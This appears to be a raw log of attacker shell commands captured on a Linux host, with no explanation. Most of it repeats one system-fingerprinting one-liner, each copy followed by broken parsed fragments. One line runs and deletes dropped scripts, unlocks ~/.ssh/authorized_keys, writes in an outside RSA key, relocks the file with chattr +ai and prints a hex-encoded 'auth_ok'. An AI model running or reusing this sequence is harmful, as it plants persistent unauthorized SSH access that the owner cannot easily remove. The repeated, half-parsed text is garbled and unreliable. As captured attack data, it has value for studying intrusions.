uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
